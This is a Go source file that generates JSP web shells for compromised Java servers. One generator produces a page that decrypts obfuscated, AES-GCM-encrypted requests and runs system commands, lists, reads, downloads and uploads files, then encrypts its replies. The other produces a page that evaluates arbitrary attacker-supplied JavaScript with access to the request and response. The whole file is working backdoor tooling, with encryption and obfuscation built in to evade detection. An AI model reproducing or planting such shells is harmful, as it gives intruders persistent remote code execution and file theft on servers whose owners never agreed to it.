package jsp

import (
	"encoding/base64"
	"fmt"
	"strings"
)

func cryptoMethods(key []byte) string {
	b64Key := base64.StdEncoding.EncodeToString(key)
	return fmt.Sprintf(
		"static final byte[] KEY=java.util.Base64.getDecoder().decode(\"%s\");"+
			"String dec(String e)throws Exception{"+
			"byte[] d=java.util.Base64.getDecoder().decode(e);"+
			"byte[] n=java.util.Arrays.copyOfRange(d,0,12);"+
			"byte[] c=java.util.Arrays.copyOfRange(d,12,d.length);"+
			"javax.crypto.Cipher a=javax.crypto.Cipher.getInstance(\"AES/GCM/NoPadding\");"+
			"a.init(javax.crypto.Cipher.DECRYPT_MODE,new javax.crypto.spec.SecretKeySpec(KEY,\"AES\"),new javax.crypto.spec.GCMParameterSpec(128,n));"+
			"return new String(a.doFinal(c),\"UTF-8\");}"+
			"String enc(String s)throws Exception{"+
			"byte[] n=new byte[12];java.security.SecureRandom.getInstanceStrong().nextBytes(n);"+
			"javax.crypto.Cipher a=javax.crypto.Cipher.getInstance(\"AES/GCM/NoPadding\");"+
			"a.init(javax.crypto.Cipher.ENCRYPT_MODE,new javax.crypto.spec.SecretKeySpec(KEY,\"AES\"),new javax.crypto.spec.GCMParameterSpec(128,n));"+
			"byte[] c=a.doFinal(s.getBytes(\"UTF-8\"));"+
			"byte[] o=new byte[12+c.length];"+
			"System.arraycopy(n,0,o,0,12);System.arraycopy(c,0,o,12,c.length);"+
			"return java.util.Base64.getEncoder().encodeToString(o);}",
		b64Key,
	)
}

func cryptoImport() string {
	return `<%@page import="javax.crypto.*,javax.crypto.spec.*,java.security.*,java.util.*,java.io.*,java.text.*"%>`
}

// pwWrap replaces out.print( with __pw.print( and out.println with __pw.println
func pwWrap(code string) string {
	code = strings.ReplaceAll(code, "out.println()", "__pw.println()")
	return strings.ReplaceAll(code, "out.print(", "__pw.print(")
}

func CryptoShellSource(key []byte) string {
	return CryptoShellSourceWith(key, DefaultObfuscator())
}

func CryptoShellSourceWith(key []byte, obf *Obfuscator) string {
	af := obf.ActionField()
	acInfo := obf.ActionCode("info")
	acExec := obf.ActionCode("exec")
	acList := obf.ActionCode("file.list")
	acRead := obf.ActionCode("file.read")
	acDown := obf.ActionCode("file.download")
	acUp := obf.ActionCode("file.upload")

	tpl := &JSPTemplates{}
	infoCode := pwWrap(tpl.Info())
	execCode := pwWrap(tpl.Exec())
	listCode := pwWrap(tpl.FileList())
	readCode := pwWrap(tpl.FileRead())
	downCode := pwWrap(tpl.FileDownload())
	upCode := pwWrap(tpl.FileUpload())

	return cryptoImport() + "\n" +
		`<%!` + cryptoMethods(key) + HelperBase64With(obf) + `%>` + "\n" +
		`<%
java.io.StringWriter __sw=new java.io.StringWriter();
java.io.PrintWriter __pw=new java.io.PrintWriter(__sw);
try{
String z0=dec(request.getParameter("` + af + `"));
if("` + acInfo + `".equals(z0)){` + infoCode + `
}else if("` + acExec + `".equals(z0)){` + execCode + `
}else if("` + acList + `".equals(z0)){` + listCode + `
}else if("` + acRead + `".equals(z0)){` + readCode + `
}else if("` + acDown + `".equals(z0)){` + downCode + `
}else if("` + acUp + `".equals(z0)){` + upCode + `
}else{__pw.print("ERR:UNKNOWN_ACTION");}
}catch(Exception ex){__pw.print("ERR:"+ex.getMessage());}
__pw.flush();out.print(enc(__sw.toString()));
%>`
}

func CryptoDynamicShellSource(key []byte) string {
	return CryptoDynamicShellSourceWith(key, DefaultObfuscator())
}

func CryptoDynamicShellSourceWith(key []byte, obf *Obfuscator) string {
	af := obf.ActionField()
	p1 := obf.Param1()
	p2 := obf.Param2()

	return cryptoImport() + "\n" +
		`<%!` + cryptoMethods(key) + `%>` + "\n" +
		`<%
try{
String z0=dec(request.getParameter("` + af + `"));
if(z0!=null&&!z0.isEmpty()){
  javax.script.ScriptEngineManager m=new javax.script.ScriptEngineManager();
  javax.script.ScriptEngine eng=m.getEngineByName("js");
  if(eng==null){
    out.print(enc("ERR:SCRIPT:ScriptEngine(Nashorn) not available"));
  }else{
    java.io.StringWriter __sw=new java.io.StringWriter();java.io.PrintWriter __pw=new java.io.PrintWriter(__sw);eng.put("out",__pw);
    eng.put("request",request);
    eng.put("response",response);
    eng.put("P1","` + p1 + `");
    eng.put("P2","` + p2 + `");
    eng.eval("var b64d=function(s){return new java.lang.String(java.util.Base64.getDecoder().decode(s),\"UTF-8\")};var b64e=function(s){return java.util.Base64.getEncoder().encodeToString(s.getBytes(\"UTF-8\"))};");
    String __js=new String(java.util.Base64.getDecoder().decode(z0),"UTF-8");
    eng.eval(__js);
    __pw.flush();
    out.print(enc(__sw.toString()));
  }
}
}catch(Exception ex){
  out.print(enc("ERR:"+ex.getMessage()));
}
%>`
}
